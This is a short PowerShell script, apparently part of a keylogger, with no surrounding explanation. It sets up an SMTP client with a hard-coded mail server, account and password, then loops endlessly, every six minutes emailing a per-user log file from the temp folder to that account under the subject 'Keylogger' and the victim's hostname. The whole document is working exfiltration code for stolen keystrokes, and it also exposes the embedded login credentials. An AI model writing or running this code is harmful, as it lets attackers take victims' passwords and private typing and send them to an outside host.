$SMTPServer = 'ha01s013.org-dns.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('admin@csgoplayer.xyz', 'srwR^926')
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'admin@csgoplayer.xyz'
$ReportEmail.To.Add('admin@csgoplayer.xyz')
$ReportEmail.Subject = 'Keylogger - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
while(1){$ReportEmail.Attachments.Add("$env:temp/$env:UserName.log");$SMTPInfo.Send($ReportEmail);sleep 360} 